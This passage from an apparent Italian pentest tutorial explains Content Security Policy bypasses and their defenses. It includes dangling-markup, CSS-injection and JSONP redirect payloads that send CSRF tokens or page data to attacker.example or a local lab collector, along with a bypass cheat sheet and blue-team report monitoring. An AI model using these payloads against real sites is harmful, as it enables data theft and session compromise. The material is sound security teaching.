Sul laboratorio (la rotta `/no-form-action` ha un form di login con un token nascosto):

```
http://127.0.0.1:8010/no-form-action?q=<form action="http://127.0.0.1:8011/log" method="get">
```

Clicca *Login*: nel log del Terminale 2 compare `GET /log?csrf=tok-7f3a&user=admin`. È il token [CSRF](https://hackita.it/articoli/csrf/) arrivato all'attaccante. Serve il click della vittima.

Esiste anche il dangling markup classico con un tag `<img src='https://attacker.example/?` lasciato aperto: assorbe l'HTML fino alla virgoletta successiva. I browser moderni bloccano però gli URL che contengono un a capo e `<`, quindi oggi funziona poco: usa il form.

### 12. CSS injection

Se la policy ammette stili inline (`style-src 'unsafe-inline'`) puoi leggere valori di un campo carattere per carattere:

```html
<style>
/* Each rule sends a request only if the input value starts with that character */
input[value^="a"] { background: url(https://attacker.example/leak?v=a) }
input[value^="b"] { background: url(https://attacker.example/leak?v=b) }
</style>
```

Serve un `input` con il valore dentro l'attributo `value` (per esempio un token pre-compilato) e `img-src` che permetta il dominio.

## Esfiltrazione con una CSP restrittiva

Anche con script in esecuzione, la CSP può impedirti di mandare i dati fuori. Dipende da **quale direttiva** controlla ogni metodo:

| Metodo                         | Direttiva che lo controlla       | Quando funziona                                                                                                                 |
| ------------------------------ | -------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| `fetch`, XHR, `sendBeacon`     | `connect-src`                    | `connect-src` permette il tuo host                                                                                              |
| `new Image().src = ...`        | `img-src`                        | `img-src` permette il tuo host (non `connect-src`)                                                                              |
| WebSocket                      | `connect-src`                    | L'host è consentito. Il significato di `'self'` per `ws:` e `wss:` cambia tra browser: prova con l'indirizzo `wss://` esplicito |
| Navigazione (`location = ...`) | Nessuna direttiva di caricamento | Quasi sempre: la navigazione verso un altro sito non è bloccata                                                                 |
| Invio di un form               | `form-action`                    | Manca la direttiva                                                                                                              |
| Query DNS                      | Dipende dal browser              | Con `<link rel="dns-prefetch">` alcuni browser fanno la query anche con CSP rigida: da verificare sul browser di destinazione   |

Nota che `new Image().src` genera una **richiesta HTTP completa**, non solo una query DNS: non è "DNS exfiltration". Per far uscire dati con una CSP chiusa, la **navigazione** è spesso la via più semplice. Sul laboratorio (`default-src 'self'`, quindi niente `fetch` né immagini esterne):

```
http://127.0.0.1:8010/self?q=<script src="/jsonp?callback=location.href='http://127.0.0.1:8011/log?d='.concat(document.domain)//"></script>
```

La pagina viene reindirizzata e nel log del Terminale 2 compare `GET /log?d=127.0.0.1`.

Per vedere un'esfiltrazione completa via XSS c'è il PoC open source di Hackita: [xss-internal-exfil-poc](https://github.com/hack-ita/xss-internal-exfil-poc). Lo script (`myexfilxss.js`) legge con una GET la risposta di un URL interno, la codifica in base64 e la manda al server dell'attaccante con una singola POST `text/plain`, che evita il preflight CORS. Con una CSP questo schema si ferma in più punti: `script-src` deve permettere di caricare lo script, e `connect-src` deve permettere la richiesta XHR verso l'host dell'attaccante. È un buon esempio di cosa deve coprire una policy ben scritta.

## Workflow di test della CSP

```bash
# 1. Extract the CSP header of the target (GET request, body discarded)
curl -s -D - -o /dev/null https://github.com | grep -i "content-security-policy"

# 2. Paste the header into the CSP Evaluator: https://csp-evaluator.withgoogle.com/
# 3. Check the exact header name: Report-Only means no blocking
# 4. Look for unsafe-inline, unsafe-eval, wildcards, https:, data:
# 5. List the allowlisted domains and look for JSONP on them (JSONBee)
# 6. Check the directives that do not inherit: base-uri, form-action, frame-ancestors
# 7. Check the nonce: does it change on every response? Is the page cached?
```

## CSP bypass cheat sheet

| Configurazione CSP                         | Bypass                                     |
| ------------------------------------------ | ------------------------------------------ |
| `'unsafe-inline'` senza nonce o hash       | Script inline diretti                      |
| `'unsafe-eval'`                            | `eval()`, `setTimeout(stringa)`            |
| `*`, `https:` o sottodominio controllabile | Script da `attacker.example`               |
| `data:` in `script-src`                    | `<script src="data:,...">`                 |
| `'self'` con JSONP, upload o riflessione   | Script dalla stessa origine                |
| CDN con AngularJS vecchio o JSONP          | Template injection o callback              |
| Path restriction e open redirect           | Redirect verso un altro percorso dell'host |
| `object-src` mancante senza `default-src`  | Contenuti `<object>` e `<embed>`           |
| `base-uri` mancante                        | `<base href>` con script relativo e nonce  |
| Nonce fisso, prevedibile o in cache        | Riuso del nonce                            |
| `strict-dynamic` con gadget                | Script creato dallo script fidato          |
| Header solo Report-Only                    | Nessun blocco                              |
| `form-action` mancante                     | Form o dangling markup                     |
| `connect-src` e `img-src` chiusi           | Navigazione con `location`                 |

## CORS vs CSP vs SOP: le differenze

Sono tre sigle che si confondono spesso, ma proteggono cose diverse e le decidono parti diverse. In una frase: la **SOP** impedisce agli altri siti di leggere i tuoi dati, il **CORS** è il permesso con cui il server dice "questo sito può leggerli", la **CSP** limita cosa può fare **la tua** pagina.

|                | SOP                                                 | CORS                                       | CSP                                                      |
| -------------- | --------------------------------------------------- | ------------------------------------------ | -------------------------------------------------------- |
| Cos'è          | Regola di default del browser                       | Meccanismo che rilassa la SOP              | Header che limita cosa la pagina carica ed esegue        |
| Chi la decide  | Il browser (standard)                               | Il server della risorsa che viene letta    | Il server della pagina                                   |
| Header         | Nessuno                                             | `Access-Control-Allow-Origin` e simili     | `Content-Security-Policy`                                |
| Cosa controlla | Chi può **leggere** le risposte di un'altra origine | Quali origini possono leggerle             | Da dove si caricano script e risorse, dove escono i dati |
| Protegge da    | Siti malevoli che leggono i dati di altri siti      | Niente: apre eccezioni controllate         | Impatto di XSS, esfiltrazione, clickjacking              |
| Errore tipico  | Non è configurabile                                 | Riflettere l'`Origin` con le credenziali   | `'unsafe-inline'`, wildcard, nonce fisso                 |
| Se manca       | C'è sempre                                          | Resta la SOP: nessuna lettura cross-origin | Nessun limite aggiuntivo alla pagina                     |

Cosa significa nei pentest:

* Una **XSS** esegue codice nell'origine della vittima. La SOP non la ferma (è la stessa origine) e il CORS non c'entra. L'unica barriera che resta è la **CSP**.
* Un **CORS mal configurato** permette a un sito dell'attaccante di leggere dati della vittima. La CSP della pagina vittima non aiuta: la richiesta parte da un'altra pagina, con le sue regole.
* Una CSP stretta non corregge un CORS sbagliato e un CORS corretto non ferma una XSS: servono tutte e tre, ognuna al suo posto.

Approfondimenti: [Same-Origin Policy](https://hackita.it/articoli/same-origin-policy/) e [CORS misconfiguration](https://hackita.it/articoli/cors-misconfiguration/).

## Come difendersi: una CSP che regge

* Usa **nonce o hash** con `'strict-dynamic'` al posto delle allowlist di host.
* Genera il nonce con un generatore casuale sicuro, **nuovo a ogni risposta**, e non mettere in cache le pagine con nonce.
* Aggiungi sempre `object-src 'none'`, `base-uri 'none'` (o `'self'`), `form-action 'self'` e `frame-ancestors`.
* Non usare `'unsafe-inline'` e `'unsafe-eval'` dove puoi evitarlo.
* Testa prima con `Content-Security-Policy-Report-Only` e raccogli le violazioni, poi passa all'header che blocca.
* Ricorda che la CSP non sostituisce la correzione: sistema l'escaping dell'output (vedi [XSS riflessa](https://hackita.it/articoli/reflected-xss/) e [XSS stored](https://hackita.it/articoli/xss-stored/)).
* Per i dettagli di ogni direttiva e browser, la documentazione di riferimento è la [guida MDN all'header Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy).

### Monitorare le violazioni: il lato blue team

La CSP non è solo un blocco: ogni violazione è un **evento** che puoi raccogliere. Con `report-uri` (o `report-to`) il browser manda un report a un endpoint tuo ogni volta che blocca qualcosa:

```http
Content-Security-Policy: default-src 'self'; report-uri /csp-report
```

La versione moderna usa `report-to` con l'header `Reporting-Endpoints`. I browser basati su Chromium la supportano, quindi per gli altri tieni anche `report-uri`:

```http
Reporting-Endpoints: csp-endpoint="https://example.com/csp-report"
Content-Security-Policy: default-src 'self'; report-to csp-endpoint
```

Nel laboratorio la rotta `/monitored` blocca e manda i report a un piccolo collettore sulla porta 8012:

```bash
# Minimal collector that prints every CSP violation report it receives
cat > csp-lab/server/csp_collector.py <<'EOF'
import json
from http.server import BaseHTTPRequestHandler, HTTPServer


class Collector(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        report = json.loads(self.rfile.read(length) or b"{}").get("csp-report", {})
        print(
            "VIOLATION:", report.get("violated-directive"),
            "| blocked:", report.get("blocked-uri"),
            "| page:", report.get("document-uri"),
            flush=True,
        )
        self.send_response(204)
        self.end_headers()

    def log_message(self, *args):
        pass


HTTPServer(("127.0.0.1", 8012), Collector).serve_forever()
EOF
```

```bash
# Terminal 3: run the collector
python3 csp-lab/server/csp_collector.py
```

Apri nel browser:

```
http://127.0.0.1:8010/monitored?q=<script>alert(1)</script>
```

Lo script viene bloccato e nel Terminale 3 compare una riga `VIOLATION:` con la direttiva violata, la risorsa bloccata e la pagina. Questo è il segnale da usare:

| Cosa vedi nei report                                     | Cosa può significare                                       |
| -------------------------------------------------------- | ---------------------------------------------------------- |
| `blocked: inline` o `eval` su pagine senza script inline | Tentativo di iniezione: non dovrebbe mai succedere         |
| `blocked-uri` verso domini sconosciuti                   | Caricamento di script esterni o tentativo di esfiltrazione |
| Violazioni di `base-uri` o `form-action`                 | Iniezione di tag `<base>` o `<form>`                       |
| Picco dopo un rilascio                                   | Un cambiamento dell'app che rompe la policy, da correggere |

Un avviso: le estensioni del browser generano molto rumore (`chrome-extension`, `moz-extension`). Filtrale prima di impostare gli allarmi. E correla i report con i log del server: la stessa pagina con parametri strani nell'URL e una violazione `inline` è quasi sempre una XSS in corso.

## Domande frequenti sulla CSP

**Cosa significa CSP?**
È la sigla di `Content Security Policy`. Il significato è: politica di sicurezza dei contenuti che il browser applica alla pagina.

**Cos'è il CSP header?**
È l'header HTTP `Content-Security-Policy` con cui il server dice al browser da dove può caricare script, immagini, stili e altre risorse.

**Cosa fa l'header Content-Security-Policy?**
Limita le risorse che la pagina può caricare ed eseguire, riducendo l'impatto delle XSS. Può anche bloccare l'incorniciamento (`frame-ancestors`) e controllare dove i form inviano i dati.

**La CSP impedisce le XSS?**
Non le impedisce: ne limita l'impatto. La vulnerabilità resta nel codice e una CSP debole si aggira.

**Cos'è CSP Report-Only?**
È la modalità `Content-Security-Policy-Report-Only`: registra le violazioni ma non blocca niente. Serve a testare una policy prima di attivarla.

**Come si testa un CSP header?**
Leggi l'header con `curl`, Burp o DevTools, valutalo con il CSP Evaluator e verifica a mano unsafe-inline, wildcard, host in allowlist, nonce e direttive mancanti.

**Cos'è un CSP bypass?**
È una tecnica che sfrutta una configurazione debole per eseguire codice o far uscire dati, nonostante la CSP.

**Come funzionano nonce e hash?**
Il nonce è un valore casuale per risposta che autorizza solo gli script che lo riportano. L'hash autorizza solo lo script con quel contenuto esatto.

**Che differenza c'è tra CORS, CSP e SOP?**
La SOP è la regola del browser che blocca la lettura cross-origin. Il CORS è il meccanismo con cui un server la rilassa per certe origini. La CSP è l'header con cui una pagina limita cosa può caricare ed eseguire.

## Conclusione

La CSP è una difesa potente quando è scritta bene e quasi inutile quando è piena di eccezioni. In un pentest il procedimento è sempre lo stesso: leggi l'header, controlla il nome (Report-Only?), cerca `unsafe-inline`, wildcard, host in allowlist, nonce e le direttive che non ereditano, poi prova la tecnica giusta sul laboratorio prima che sul bersaglio. Per il quadro completo degli attacchi che la CSP prova a fermare, torna alla guida sulle [XSS](https://hackita.it/articoli/xss/). Per aggirare i filtri di input prima ancora della CSP guarda anche [XSS filter bypass](https://hackita.it/articoli/xss-filter-bypass/) e [XSS WAF bypass](https://hackita.it/articoli/xss-waf-bypass/). Per capire come il browser separa le origini e perché CORS e CSP sono cose diverse leggi la [Same-Origin Policy](https://hackita.it/articoli/same-origin-policy/).

Se invece difendi: parti da una policy con nonce e `'strict-dynamic'`, chiudi `object-src`, `base-uri` e `form-action`, testala in Report-Only e raccogli le violazioni. Un report che arriva da una pagina senza script inline è il tuo primo allarme di XSS.

*Disclaimer: usa queste tecniche solo su sistemi con autorizzazione esplicita scritta. Attività non autorizzate su sistemi altrui costituiscono reato (art. 615-ter c.p.).*
